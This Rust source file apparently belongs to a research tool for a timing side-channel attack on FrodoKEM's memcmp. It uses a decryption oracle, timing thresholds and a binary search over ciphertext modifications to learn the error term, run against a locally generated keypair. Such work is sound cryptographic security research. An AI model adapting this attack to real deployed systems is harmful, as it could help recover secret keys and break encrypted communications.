use super::modify_and_measure::*;
use crate::attack::memcmp_frodo::MeasureSource;
use crate::utils::Recorder;
use liboqs_rs_bindings as oqs;
use log::{debug, info, warn};
use log_derive::logfn_inputs;
use oqs::frodokem::FrodoKem;
use oqs::frodokem::KemBuf;
use std::convert::TryInto;

#[logfn_inputs(Trace)]
fn search_modification<FRODO: FrodoKem>(
    index_ij: usize,
    iterations: usize,
    measure_source: &MeasureSource,
    short_circuit_threshold: u64,
    ciphertext: &mut FRODO::Ciphertext,
    shared_secret_d: &mut FRODO::SharedSecret,
    secret_key: &mut FRODO::SecretKey,
) -> Result<u16, String> {
    let maxmod = max_mod::<FRODO>();
    let mut high = maxmod;
    let mut low = 0;
    let found = loop {
        let currentmod: u16 = ((high as usize + high as usize + low as usize) as usize / 3)
            .try_into()
            .map_err(|_| "overflow")?;
        debug!("high: {}, low: {}", high, low);
        info!(
            "C[{}/{}] => Testing adding {} to C[{}] with {} iterations.",
            index_ij,
            FRODO::C::len() - 1,
            currentmod,
            index_ij,
            iterations
        );
        let time = mod_measure::<FRODO, _>(
            currentmod,
            index_ij,
            iterations,
            &measure_source,
            ciphertext,
            shared_secret_d,
            secret_key,
            &mut Recorder::medianval(format!("MEDIAN[{}]{{{}}}", index_ij, currentmod)),
        )?;

        debug!("time measurment is {}", time);
        if time >= short_circuit_threshold {
            info!(
                "C[{}/{}] => +Raising lowerbound to {}",
                index_ij,
                FRODO::C::len() - 1,
                currentmod
            );
            low = currentmod;
        } else {
            info!(
                "C[{}/{}] => -Lowering upperbound to {}",
                index_ij,
                FRODO::C::len() - 1,
                currentmod
            );
            high = currentmod;
        }
        if high - low == 1 {
            break low;
        }
    };
    if high == maxmod {
        warn!("Upper bound never changed, we might have missed the real threshold modification!");
    }
    if low == 0 {
        warn!("Lower bound never changed, we might have missed the real threshold modification!");
    }

    Ok(found)
}

#[logfn_inputs(Trace)]
pub fn find_e<FRODO: FrodoKem>(
    warmup: usize,
    iterations: usize,
    measure_source: MeasureSource,
) -> Result<(), String> {
    info!(
        "Launching the find_e routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );
    let mut public_key = FRODO::PublicKey::new();
    let mut secret_key = FRODO::SecretKey::new();
    let mut ciphertext = FRODO::Ciphertext::new();

    info!("Generating keypair");
    FRODO::keypair(&mut public_key, &mut secret_key)?;

    info!("Encapsulating shared secret and generating ciphertext");
    let mut shared_secret_e = FRODO::SharedSecret::new();
    let mut shared_secret_d = FRODO::SharedSecret::new();
    FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;

    info!("Running decryption oracle {} times for warmup.", warmup);
    let warmuptime = mod_measure::<FRODO, _>(
        0,
        0,
        warmup,
        &measure_source,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
        &mut Recorder::minval(),
    )?;
    debug!("Warmup time {}", warmuptime);

    let last_index = FRODO::C::len() - 1;
    let lowmod = 1;

    info!("Profiling phase ==> Running {} iterations ciphertextmod of C[{}] += {}, to establish upper bound timing threshold.", iterations, last_index, lowmod);
    let threshold_high = mod_measure::<FRODO, _>(
        lowmod,
        last_index,
        iterations,
        &measure_source,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
        &mut Recorder::medianval(format!("PROFILE[{}]{{{}}}", last_index, lowmod)),
    )?;

    let maxmod = max_mod::<FRODO>();

    info!("Profiling phase ==> Running {} iterations ciphertextmod of C[{}] += {}, to establish lower bound timing threshold.", iterations, last_index, maxmod);
    let threshold_low = mod_measure::<FRODO, _>(
        maxmod,
        last_index,
        iterations,
        &measure_source,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
        &mut Recorder::medianval(format!("PROFILE[{}]{{{}}}", last_index, maxmod)),
    )?;

    let threshold = (threshold_high + threshold_low) / 2;
    info!(
        "Using ({}+{})/2={} as threshold value, everything below will be used to detect changes to B as well.", threshold_high, threshold_low,
        threshold
    );

    let mods : Result<Vec<_>, String> = (0..FRODO::C::len()).map(|index_ij|{
        info!("C[{}/{}] => Starting binary search for determining maximum modifications to C without affecting B, for this index.", index_ij, FRODO::C::len()-1);

        let themod = search_modification::<FRODO>(
            index_ij,
            iterations,
            &measure_source,
            threshold,
            &mut ciphertext,
            &mut shared_secret_d,
            &mut secret_key,
        )?;

        info!(
            "C[{}/{}] => Found {}!",index_ij, FRODO::C::len()-1,
            themod
        );

        Ok(themod)
    }).collect();

    //bailout on error
    let mods = mods?;

    info!("We have found all mods!");
    info!("{:?}", mods);

    Ok(())
}
